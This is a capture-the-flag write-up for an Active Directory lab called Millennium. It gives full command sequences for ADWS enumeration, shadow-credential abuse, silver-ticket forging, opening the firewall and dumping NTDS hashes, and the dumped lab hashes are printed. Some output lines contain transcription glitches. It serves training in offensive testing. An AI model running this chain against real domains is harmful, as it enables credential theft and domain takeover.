---
difficulty: Medium
os: Windows - Active Directory
tags:
  - ADWS
  - Shadow-Creds
  - RBCD
  - Silver-Ticket
summary: A medium difficulty AD box where SMB and LDAP are practically blocked, making most of your usual tools useless.
---
# Overview
---

Millennium is a Medium difficulty Active Directory lab authored by Ross (another goat of the Hack Smarter Community). It is a unique box where SMB and LDAP are blocked as attack paths, forcing you to think outside the box to fully compromise the domain and accomplish the assigned objective of retrieving the NT hash of `krbtgt`.

---
# Objective
---
Millennium Corp recently underwent a penetration test that revealed significant exposure through SMB and LDAP based attack paths. In response, the organization rapidly implemented host-based firewall restrictions and hardened traditional network services across the environment.

Believing these mitigations to be sufficient, Millennium Corp has commissioned a follow-up internal black box penetration assessment from the HackSmarter team under an **assumed breach scenario**.

As the operator, you are placed inside the corporate network. Traditional lateral movement paths such as SMB and LDAP are heavily restricted or monitored, forcing you to _**heavily rethink**_ conventional Active Directory enumeration and attack strategies.

Your objective is to:

- Enumerate the environment under constrained network conditions
- Identify alternative attack surfaces beyond SMB and LDAP
- Escalate privileges to achieve full domain compromise and prove post compromise.

Millennium Corp believes their defenses have closed the gaps exposed in their previous assessment.

Your task is to prove otherwise.

### Initial Access
---

```
Username: tester
Password: Pencil Testers
```

---

# Reconnaissance 

I started out with a port scan, which revealed the target to be running the classic DC services on its ports.

```bash
rustscan -a 10.1.96.247 --ulimit 5000 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time :hourglass:

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.1.96.247:53
Open 10.1.96.247:88
Open 10.1.96.247:135
Open 10.1.96.247:139
Open 10.1.96.247:464
Open 10.1.96.247:593
Open 10.1.96.247:3268
Open 10.1.96.247:3269
Open 10.1.96.247:3389
Open 10.1.96.247:5985
Open 10.1.96.247:9389
Open 10.1.96.247:49158
Open 10.1.96.247:49181
Open 10.1.96.247:49212
Open 10.1.96.247:49664
Open 10.1.96.247:49667
Open 10.1.96.247:49669
Open 10.1.96.247:49678
...
```

From the port scan we can manually add the domain name and IP to our `/etc/hosts` file and configure our `/etc/krb5.conf`.

```bash
echo "10.1.96.247 DC01.MILLENNIUM.CORP millennium.corp dc01" | sudo tee -a /etc/hosts
```

krb5.conf:

```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = MILLENNIUM.CORP

[realms]
    MILLENNIUM.CORP = {
        kdc = DC01.MILLENNIUM.CORP
        admin_server = DC01.MILLENNIUM.CORP
        default_domain = MILLENNIUM.CORP
    }

[domain_realm]
    .millenium.corp = MILLENNIUM.CORP
    millenium.corp = MILLENNIUM.CORP
```

I wanted to make sure that SMB and LDAP were really blocked, so I ran `nxc` but obviously it failed silently, then I tried WinRM and RDP with the assumed breach credentials. Again those obviously failed. 

So I went back to thinking for a bit, then I looked back at the ports, `9389` looked interesting.


Port 9389 is the default port for **Active Directory Web Services (ADWS)**, a SOAP-based (Simple Object Access Protocol) web service that Microsoft ships on every domain controller. Introduced with Windows Server 2008 R2 and enabled automatically when a server is promoted to a DC, ADWS gives management tools a web-friendly way into the directory: the **ActiveDirectory PowerShell module** (`Get-ADUser`, `Get-ADComputer`, and friends) and the **Active Directory Administrative Center (ADAC)** both talk to 9389 rather than hitting LDAP directly. Under the hood, ADWS wraps directory queries in SOAP messages over a .NET `Net.TCP` binding, hands them to the directory service running on the same box, and returns the results. In practice that makes port 9389 an **alternate query channel for the same data you’d normally pull over [LDAP on port 389](https://www.pentestpad.com/port-exploit/port-389-ldap-lightweight-directory-access-protocol)** — and, increasingly, the channel attackers reach for precisely _because_ defenders are watching LDAP and not ADWS.

(Source: [Port 9389 – ADWS (Active Directory Web Services)](https://www.pentestpad.com/port-exploit/port-9389-adws-active-directory-web-services/))

Then I surfed google to find a tool that can attack ADWS, and there was one very great one.

[SOAPy](https://github.com/logangoins/SoaPy) is a Proof of Concept (PoC) utility for conducting offensive interaction with Active Directory Web Services (ADWS) through a SOCKS5 proxy.

SOAPy includes previously undeveloped custom python implementations of a collection of Microsoft protocols required for interaction with the ADWS service. This includes but is not limited to: NNS (.NET NegotiateStream Protocol), NMF (.NET Message Framing Protocol), and NBFSE (.NET Binary Format: SOAP Extension).

Now that was the key to start proper enumeration of the domain.

----

# Enumeration

With SOAPy I dumped the domain objects:

```bash
SOAPy 'millennium.corp/tester:Pencil Testers@10.1.96.247' --users
```

SOAPy dumps into your current directory in a `.soap_data` file, running it again appends to that file.

```bash
SOAPy 'millennium.corp/tester:Pencil Testers@10.1.96.247' --groups
```

```bash
SOAPy 'millennium.corp/tester:Pencil Testers@10.1.96.247' --computers
```

```bash
SOAPy 'millennium.corp/tester:Pencil Testers@10.1.96.247' --admins
```

I also tested to find SPNs or AS-REP roastable accounts using it but results came back empty.

Using another tool called [`Soaphound.py`](https://pypi.org/project/soaphound/) we can query ADWS to generate a file ready for ingestion by bloodhound, similar to bloodhound-python and many other tools of the same nature.

```bash
soaphound -c ADWSOnly -d millennium.corp -dc dc01.millennium.corp -u tester -p 'Pencil Testers' --zip --output-dir .
```

Now we can run bloodhound and upload the files for ingestion.

---
### Tester to Sully via Shadow Creds

In bloodhound we can see that our account `tester` has `GenericAll` on the `sully` account.

![](attachments/Pasted%20image%2020261105204156.png)

And as a certified shadow credentials enjoyer, I wouldn't miss an opportunity to perform this attack. Luckily `SOAPy` makes it very easy to execute shadow credentials.

```bash
SOAPy 'millennium. corp/tester:Pencil Testers@10.1.96.247' --shadow-creds add --shadow-target sully

SOAPy
v1.0.0-dev
_Logangoins
github. com/jlevere

*] Searching for target account: sully
*] Connecting to 10.1.96.247 for resource :Enumeration
[+] Target found: CN=Sully, OU=ITOps, OU=Departments, DC=MILLENNIUM, DC=CORP
*] Generating certificate ...
[+] Certificate generated
[*] Generating KeyCredential ...
+] KeyCredential generated with DeviceID: f1e3a051-0dóc-9fód-68be-12b284c5fb67
*] Connecting to 10.1.96.247 for resource : Enumeration
[*] Updating msDS-KeyCredentialLink attribute ...
*] Connecting to 10.1.96.247 for resource : Resource
+] Successfully updated msDS-KeyCredentialLink
] No filename provided, using: ajTl3u7E
[*] No password provided, using: eTiTKJ118g1RbPLi82Yr
/home/kali/. local/share/pipx/venvs/soapy/Lib/python3.14/site-packages/src/shadow_credentials.py:145: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed
y RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
cert_obj = x509.Load_pem_x509_certificate(pem_cert_data, default_backend())
[+] Saved PFX certificate: ajTL3u7E.pfx
[+] PFX password: eTiTKJ118g1RbPLi82Yr

*** + *** + **
```

From there we can use `certipy` to authenticate with the acquired `.pfx` cert and get the NTLM hash of Sully.

```bash
certipy auth -pfx <name of pfx file>.pfx -password '<password of the pfx file>' -dc-ip 10.1.96.247 -debug -username sully -domain millennium.corp|
```

---

### Sully to DC01$

Then I went to check what `sully` has writes/outbound controls over, a `GenericWrite` on `DC01$`.

![](attachments/Pasted%20image%2020261105205703.png)

This can be abused in two ways, RBCD (Resource-Based Constrained Delegation) where you register a computer account and have it be able to impersonate any user account through the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, or it can be used for shadow credentials. And as I mentioned previously, I am a certified shadow creds enjoyer so I went with that.

```bash
SOAPy 'millennium. corp/sully@10.1.96.247' -nt <nt hash here> --shadow-creds add --shadow-target dc01$
```

Then again auth with cert via `certipy`.

```bash
certipy auth -pfx 9wdCoccT.pfx -password 'MZdfVjP47c1dK7qsCOVz' -dc-ip 10.1.96.247 -debug -username dc01$ -domain millennium.corp
```

From there I was a little beat on how to actually dump hashes since the goal was to obtain the NT hash of `krbtgt`, with a good nudge from a friend (shoutout to xjr) I went with a nice silver ticket path.

---

### Silver Ticket to Administrator WinRM Session

As `DC01$` we can forge a ticket for `Administrator` with the `Domain Admins` and `Enterprise Admins` groups for the WinRM service.

```bash
impacket-ticketer \
  -nthash putdc01nthashhere \
  -domain-sid S-1-5-21-1691246242-3114514786-1121500304 \
  -domain millennium.corp \
  -spn 'HTTP/DC01.MILLENNIUM.CORP' \
  -groups 512,519 \
  -user-id 500 \
  Administrator
```

This works because `DC01$`’s own hash is what the HTTP/WinRM SPN on DC01 is keyed with (host-based SPNs are backed by the machine account’s credentials). So this isn’t a Golden Ticket at all it’s a **Silver Ticket**: no krbtgt needed, forged entirely with DC01$’s own key, scoped just to the WinRM service on DC01, claiming to be Administrator (RID 500) in Domain Admins + Enterprise Admins (512/519).

```bash
RB5CCNAME=Administrator.ccache evil-winrm -i DC01.MILLENNIUM.CORP -r MILLENNIUM.CORP
```

From the WinRM session we can disable the firewall rules on SMB (445) to allow us to dump `NTDS` with `secretsdump.py`

```powershell
"TCP", "UDP" | ForEach-Object { New-NetFirewallRule -DisplayName "Allow All $_" -Direction Inbound -Action Allow -Protocol $_ -LocalPort Any -Profile Any }
```

Then dump hashes to reach our objective.

```bash
secretsdump.py -hashes :960ca9978ae5c08d3551c55c38e435ff 'MILLENNIUM.CORP/DC01$@10.1.96.247'
Impacket vo.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid: rid: mhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec :::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31docfe0d16ae931b73c59d7e0c089c0: : :
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5c72593d9552612093430f0b40d112bc :::
MILLENNIUM.CORP\tester:1105:aad3b435b51404eeaad3b435b51404ee:879aa860ba74fd41c5c05addd70a1a77: : :
MILLENNIUM.CORP\ATHENA:1106:aad3b435b51404eeaad3b435b51404ee:ab3771ce4ec53c16e4feae2b331cb9fe :: :
MILLENNIUM.CORP\Sully:1107:aad3b435b51404eeaad3b435b51404ee:7824282ac1df535de6726dac2b68556e: : :
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:960ca9978ae5c08d3551c55c38e435ff :::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2a7a5acaa6590b40d8507ad65062781ee73f725db837a1e8e07a1cddea713457
Administrator:aes128-cts-hmac-sha1-96:07bfd4e01e34761f1989fd87e5ecc202
Administrator:des-cbc-md5:29fdb03dfb687973
krbtgt:aes256-cts-hmac-sha1-96:077930317258126e4359ad393948a99207cófbf0ba8b8537e7a6a99fe3f14427
krbtgt:aes128-cts-hmac-sha1-96:8b06a2e16ccf1e64ce3f8aeb55cdf18f
krbtgt:des-cbc-md5:efbcb5cd23cb9440
MILLENNIUM.CORP\tester:aes256-cts-hmac-sha1-96:17c5cd7dcb533fb7b4b8716c54bcbe3a31f8f3073dc38458bd0d021c0fd783ad
MILLENNIUM.CORP\tester:aes128-cts-hmac-sha1-96:2a2bce29cdb27378396ddboa0f4ee48f
MILLENNIUM.CORP\tester:des-cbc-md5:2acb621ff43ec794
MILLENNIUM.CORP\ATHENA:aes256-cts-hmac-sha1-96:6ce3202ada51200a43d2425ce8ff448dc7dc8a3d27c179d2689c82a1d3d1a2b4
MILLENNIUM.CORP\ATHENA:aes128-cts-hmac-sha1-96:6c4a3e8d34ff491109328e01668eb854
MILLENNIUM.CORP\ATHENA:des-cbc-md5:cdb315541ff7f23b
MILLENNIUM.CORP\Sully:aes256-cts-hmac-sha1-96:9d5eaff70d67dbe435e736c667bóbf85c0ad5275dd4749f5adda52358ca46d4d
MILLENNIUM.CORP\Sully:aes128-cts-hmac-sha1-96:8251c7b654fd7a7e4828d8bd8fee698b
MILLENNIUM.CORP\Sully:des-cbc-md5:460d79ce04f4bfc1
DC01$:aes256-cts-hmac-sha1-96:1769eboa7d3ad0c5dc6acb8c677c410497e8336a3a3879ee82a8f8b33c1868ba
DC01$: aes128-cts-hmac-sha1-96:203a6cb92499dc4dca7a93e4ef2a3240
DC01$:des-cbc-md5: 7a616e896761fd89
[*] Cleaning up ...
```
